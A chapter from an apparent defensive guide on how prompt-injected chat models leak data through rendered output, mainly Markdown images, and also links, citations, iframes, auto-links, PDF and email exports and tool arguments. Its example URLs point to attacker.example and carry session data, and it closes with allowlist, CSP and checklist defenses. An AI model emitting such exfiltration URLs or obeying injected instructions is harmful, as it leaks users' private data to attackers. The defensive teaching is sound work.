# Output Exfiltration

The class of bug where the model didn't say anything wrong, but the channel through which it spoke leaked the secret.

This chapter is about what happens *after* the model emits its response. Most of the prompt-injection literature focuses on what the model says — did it leak the data, did it follow the malicious instructions, did it produce out-of-policy content. The output-handling chapter is a quieter problem and a more pervasive one. The model can produce output that, to a casual reading, looks fine. The rendering layer that turns that output into something the user sees is where the leak happens. The channel is the bug, not the content.

OWASP LLM05 — Improper Output Handling — is the entry. The classical analogue is *output encoding failures*: cross-site scripting, SQL injection from log lines, open-redirect from `Location` headers constructed without validation. The pattern is the same. Untrusted output (which now includes anything the model produces) is rendered or interpreted by a downstream component without sanitization. The downstream component does what its rendering rules tell it to do — fetches the image, follows the redirect, executes the script — and the attacker has won.

The novelty is that the producer of the untrusted output is something developers have grown accustomed to thinking of as part of *their* system rather than as untrusted input. The model is not the attacker. The model has been *told what to say* by the attacker, through any of the channels in chapters 3, 4, and 5. The downstream rendering layer doesn't know the difference.

## The canonical case: image-fetch via Markdown

Almost every chat UI on the web today renders Markdown. Almost every Markdown renderer dereferences `![alt](url)` by causing the browser to issue a GET request to `url`. Almost no chat UI restricts what `url` can be.

The attack:

1. The attacker (via direct or indirect injection) gets the model to include in its response a Markdown image whose URL contains the data the attacker wants to exfiltrate. Example: `![status](https://attacker.example/log?session_data=...)`.
2. The model emits the response. The *response itself* does not look obviously bad — it might contain the legitimate answer to the user's question, with the image trailing along.
3. The user's browser receives the response, the front-end calls `marked.parse()` (or equivalent) on it, the resulting HTML contains the `<img>` tag, the browser fetches the URL, and the data is now in the attacker's logs.

The harness's `attacks/ch09_markdown_exfil.py` script demonstrates this end to end. The chat UI uses `marked.js`, the model is instructed (via direct injection in this demonstration; in production it would be indirect) to include a status indicator image at the bottom of every response, and the URL of the image carries a one-sentence summary of the most sensitive thing in the conversation, URL-encoded.

The user sees an answer to their question. The user might not notice the small image at the bottom; if they do, they assume it's a UI element. The browser has already done the fetch by the time the user could react.

The defense pattern is straightforward in principle and inconsistently applied in practice:

- *Disable image rendering entirely.* The cheapest defense; works if your UX can tolerate it. Many B2B chat UIs can; consumer ones often cannot.
- *Restrict image URLs to an allowlist.* Only `cdn.yourdomain.com` images render. Any other URL is shown as a literal `[image: url]` text or stripped. This is the right answer for most products. It is also the answer most products do not implement until after the first incident.
- *Strip the image markdown before rendering.* If the model is not supposed to be embedding images at all, just remove them from the output. Sed-level trivial. Catches this entire attack class.
- *Content Security Policy.* `img-src 'self' cdn.yourdomain.com` enforced by the browser. Belt-and-suspenders alongside the application-level allowlist. The CSP is the failsafe that catches the case where your application-level filter has a bug.

## The other channels

Image fetches are the most-publicized, but they are not the only side channel through Markdown rendering. Anything that causes the rendering layer to dereference attacker-controlled URLs is in scope.

**Link rendering.** `[click here](https://attacker.example/log?...)` shown to the user. The fetch only happens if the user clicks, so this is less reliable than image fetches, but it is also less restricted by content-security policies and works against UIs that disable image loading. The exfil happens when a user, looking at what appears to be a helpful link, clicks. UX-level mitigations (showing the URL in a hover, requiring confirmation for external domains) help; URL allowlisting is the structural fix.

**Citation footnotes.** Several chat products auto-render citation references with link previews or auto-fetch link metadata. If the model emits a citation to `[1]: https://attacker.example/log?...`, and the front-end fetches the page to extract a title or favicon for display, you have the same exfil with one extra hop.

**iframe embeds in some Markdown variants.** Github-flavored Markdown doesn't render iframes; some custom Markdown variants do, especially in note-taking and wiki applications. An iframe with an attacker-controlled `src` makes the same fetch the image-tag does, with strictly more capability.

**HTML pass-through.** Some Markdown renderers pass through inline HTML by default. If yours does, the model can emit a `<script>` tag and you have stored XSS through your AI output. Most modern renderers default-disable this; check yours.

**Auto-link detection.** Even if the model uses no Markdown syntax at all, many UIs autolink bare URLs in plain text. The model emits `Visit attacker.example/log?secret=foo for more details.` The UI helpfully turns the URL into a clickable link. The user, if they click, is the same exfil-on-click as above.

**Embedded objects in PDF or rich-text exports.** If the chat product offers "export this conversation as PDF" and the PDF generator dereferences external resources during rendering (some do), the exfil happens at export time without the user even seeing the PDF.

**Email rendering.** A chat product that emails conversation summaries to users (or to support engineers) is doing more rendering, in a context where the recipient has different security expectations than a chat window. The email's HTML can contain images, links, tracking pixels. If the model can influence the email body and the email is rendered with images-on-by-default in the recipient's client, the exfil is across the email boundary.

The pattern is consistent: every place where the model's output is interpreted by a renderer that dereferences URLs, you have a side channel. The list of such places is longer in production than people realize, because each new feature (export, email summary, share-this-conversation, Slack integration) opens a new rendering context with its own dereferencing rules.

## Tool-side channels (recap from chapter 8)

If your product has tools, the same class of bug applies to tool arguments. A `search_web(query)` tool whose query argument the model can stuff with sensitive data leaks that data to the search provider. A `fetch_url(url)` tool whose URL contains query-string data leaks it to the URL's host. A `send_to_slack(channel, message)` tool with attacker-controlled channel argument exfils the message to the wrong channel.

These were covered in chapter 8 from the tool-permission angle. They belong in this chapter from the output-handling angle. The unified rule is the same: any place where what the model emits becomes a request to a third party is a side channel that needs treating as such.

## Why this class is so persistent

A few reasons it keeps showing up in new products:

1. **The model's output looks like content, not like code.** Markdown is text. Text is the safe thing, intuitively. The mental model "this is just words" doesn't trigger the input-validation reflex that "this is HTML the user submitted" would. It should.
2. **The renderer is upstream of the developer's mental model.** When you `npm install marked`, you are adding a renderer that does what renderers do. The fact that this particular renderer's output is going to be fed text from a non-deterministic, sometimes-attacker-controlled source is your problem, not the renderer's. But it is easy to forget.
3. **The features are valuable.** Image rendering in chat is genuinely useful. Auto-linking is useful. Link previews are useful. Removing them costs UX. The defense often gets traded away in product reviews because the cost is visible and the threat is theoretical until the first incident.
4. **The exfil is invisible.** The user sees a normal-looking response. Unlike a system-prompt extraction or a customer-data leak in plaintext, this attack does not produce a "look what the bot just did" screenshot. The leak is in the network log of an attacker the victim has never heard of.

## A defender's checklist

For every chat product, walk through this list:

- [ ] What does the front-end do with the model's output? List every transformation: Markdown rendering, syntax highlighting, link auto-detection, embed expansion, citation rendering, image loading.
- [ ] For each transformation, what URLs does it dereference, and when? Image src on render. Link href on click. iframe src on render. Citation URL on hover-preview.
- [ ] For each dereferencing path, is the URL allowlisted? Or can the model emit `https://attacker.example/...` and have it fetched?
- [ ] Is there a Content Security Policy enforced by the browser? What does `img-src` and `connect-src` allow?
- [ ] Are there other rendering contexts? PDF export, email summary, Slack integration, mobile push notification body. Each one is its own rendering layer with its own rules.
- [ ] If the model emits something the renderer doesn't recognize, what happens? (Some renderers fall back to passing through HTML, which is a worse failure than not rendering at all.)
- [ ] Is the system prompt instructed not to emit images or links to non-allowlisted hosts? (Belt-and-suspenders; useful but not load-bearing.)
- [ ] When the system handles an attack, does it log? Can your SOC see "the model emitted an image URL outside the allowlist" as an event?

If you can't answer most of these for your product, this is the chapter to start fixing first. Output handling is the cheapest exfil channel for the attacker because it requires nothing exotic: the model just has to be talked into emitting a URL, which is a thing models love to do.

## Sources

- OWASP LLM Top 10, LLM05 (Improper Output Handling).
- Johann Rehberger (Embrace the Red), the running series on Markdown-image exfiltration documented across Microsoft Copilot, ChatGPT, Claude.ai, Gemini, and others. See `embracethered.com` for the catalog.
- The original "EchoLeak" disclosure against Microsoft 365 Copilot, June 2025, which combined indirect injection with Markdown-image exfiltration to extract email content. CVE-2025-32711.
- Riley Goodside's threads on chat-product side channels, 2024–2025.
- The Mozilla and Chromium Content Security Policy documentation, for the failsafe-layer details: <https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP>
